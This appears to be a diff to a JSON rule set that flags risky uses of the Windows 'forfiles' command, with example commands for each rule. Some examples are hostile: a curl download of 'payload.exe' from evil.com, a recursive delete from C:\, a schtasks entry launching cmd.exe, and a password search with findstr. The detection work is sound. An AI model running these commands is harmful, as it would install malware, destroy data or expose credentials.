@@ -15,7 +15,7 @@
         {
           "pattern": "forfiles /c ... (curl|wget|certutil|ncat|ftp)",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /p C:\\\\Temp /m *.* /c cmd /c curl http://evil.com/payload.exe -o C:\\\\temp\\\\p.exe",
+          "example": "forfiles /p C:\\Temp /m *.* /c cmd /c curl http://evil.com/payload.exe -o C:\\temp\\p.exe",
           "match": {
             "flags_any": [
               "/c"
@@ -29,8 +29,6 @@
         "executes-code"
       ],
       "likely_consequences": [
-        "data-loss",
-        "data-corruption",
         "computer-security-compromise"
       ],
       "reversible": "depends",
@@ -45,7 +43,7 @@
         {
           "pattern": "forfiles /c ... (runas|schtasks|sc|icacls|net user)",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /p C:\\\\Tasks /m *.xml /c cmd /c schtasks /create /tn NewTask /tr cmd.exe",
+          "example": "forfiles /p C:\\Tasks /m *.xml /c cmd /c schtasks /create /tn NewTask /tr cmd.exe",
           "match": {
             "flags_any": [
               "/c"
@@ -74,7 +72,7 @@
         {
           "pattern": "forfiles /c ... powershell ...",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /p C:\\\\Temp /m *.* /c cmd /c powershell -command Get-Process",
+          "example": "forfiles /p C:\\Temp /m *.* /c cmd /c powershell -command Get-Process",
           "match": {
             "flags_any": [
               "/c"
@@ -87,7 +85,7 @@
         "executes-code"
       ],
       "likely_consequences": [
-        "computer-security-compromise"
+        "unsafe-code-execution"
       ],
       "reversible": "depends",
       "reversible_note": "Depends entirely on what PowerShell code is executed.",
@@ -101,7 +99,7 @@
         {
           "pattern": "forfiles /s /c ...",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /s /p C:\\\\ /m *.* /c cmd /c del @path",
+          "example": "forfiles /s /p C:\\ /m *.* /c cmd /c del @path",
           "match": {
             "flags_all": [
               "/c",
@@ -115,8 +113,7 @@
         "recursive"
       ],
       "likely_consequences": [
-        "data-loss",
-        "computer-security-compromise"
+        "data-loss"
       ],
       "reversible": "depends",
       "reversible_note": "Depends on the command in /c and the scope of /s recursion.",
@@ -130,7 +127,7 @@
         {
           "pattern": "forfiles /c ... (del|rd|rmdir)",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /p C:\\\\Temp /m *.log /c cmd /c del @path",
+          "example": "forfiles /p C:\\Temp /m *.log /c cmd /c del @path",
           "match": {
             "flags_any": [
               "/c"
@@ -153,23 +150,23 @@
     },
     {
       "id": "forfiles-writes",
-      "description": "The /c flag combined with a file-writing command or shell redirection creates or modifies files on disk.",
+      "description": "The /c flag combined with a file-writing command or shell redirection overwrites files on disk.",
       "patterns": [
         {
           "pattern": "forfiles /c ... > ...",
           "pattern_type": "pipe",
-          "example": "forfiles /p C:\\\\Temp /m *.txt /c cmd /c type @path > output.txt",
+          "example": "forfiles /p C:\\Temp /m *.txt /c cmd /c type @path > output.txt",
           "match": {
             "flags_any": [
               "/c"
             ],
-            "raw_pattern": ">\\s*\\S+"
+            "raw_pattern": ">(?!>)\\s*\\S+"
           }
         },
         {
           "pattern": "forfiles /c ... (copy|xcopy|robocopy)",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /p C:\\\\Temp /m *.bak /c cmd /c copy @path C:\\\\Backup\\\\",
+          "example": "forfiles /p C:\\Temp /m *.bak /c cmd /c copy @path C:\\Backup\\",
           "match": {
             "flags_any": [
               "/c"
@@ -179,13 +176,44 @@
         }
       ],
       "risk_tags": [
+        "writes-files",
+        "irreversible"
+      ],
+      "likely_consequences": [
+        "data-loss",
+        "data-corruption"
+      ],
+      "reversible": "no",
+      "severity": "ERROR",
+      "all_match": false,
+      "notes": "Redirection (>) and copy/xcopy/robocopy commands default to overwriting existing files."
+    },
+    {
+      "id": "forfiles-write-append",
+      "description": "The /c flag combined with shell append redirection adds content to the end of a file.",
+      "patterns": [
+        {
+          "pattern": "forfiles /c ... >> ...",
+          "pattern_type": "pipe",
+          "example": "forfiles /p C:\\Temp /m *.txt /c cmd /c type @path >> output.txt",
+          "match": {
+            "flags_any": [
+              "/c"
+            ],
+            "raw_pattern": ">>\\s*\\S+"
+          }
+        }
+      ],
+      "risk_tags": [
         "writes-files"
       ],
+      "likely_consequences": [
+        "data-corruption"
+      ],
       "reversible": "depends",
-      "reversible_note": "Overwriting existing files is not reversible. Creating new files is technically reversible but the content may contain sensitive data.",
+      "reversible_note": "Appending does not destroy original content, but modifies the file. Reversibility depends on whether the addition can be surgically removed.",
       "severity": "WARNING",
-      "all_match": false,
-      "notes": "Both redirection (>, >>) and copy/xcopy/robocopy commands are included. >> appends, while > overwrites. Overwrite is irreversible."
+      "all_match": false
     },
     {
       "id": "forfiles-date-exec",
@@ -194,9 +222,9 @@
         {
           "pattern": "forfiles ... /d ... /c ...",
           "pattern_type": "flag-argument-combination",
-          "example": "forfiles /p C:\\\\Temp /d -30 /c cmd /c del @path",
+          "example": "forfiles /p C:\\Temp /d -30 /c cmd /c del @path",
           "match": {
-            "flags_any": [
+            "flags_all": [
               "/d",
               "/c"
             ]
@@ -225,9 +253,9 @@
         {
           "pattern": "forfiles ... | ...",
           "pattern_type": "pipe",
-          "example": "forfiles /p C:\\\\Temp /m *.txt /c cmd /c type @path | findstr password",
+          "example": "forfiles /p C:\\Temp /m *.txt /c cmd /c type @path | findstr password",
           "match": {
-            "raw_pattern": "\\|"
+            "raw_pattern": "\\|\\s*(?i)(findstr|more|sort|clip)"
           }
         }
       ],
@@ -246,7 +274,7 @@
         {
           "pattern": "forfiles /c ...",
           "pattern_type": "flag",
-          "example": "forfiles /p C:\\\\Temp /m *.bat /c cmd /c echo @path",
+          "example": "forfiles /p C:\\Temp /m *.bat /c cmd /c echo @path",
           "match": {
             "flags_any": [
               "/c"
@@ -270,7 +298,7 @@
         {
           "pattern": "forfiles /s /p ... /m ...",
           "pattern_type": "flag",
-          "example": "forfiles /s /p C:\\\\ /m *.txt",
+          "example": "forfiles /s /p C:\\ /m *.txt",
           "match": {
             "flags_any": [
               "/s"
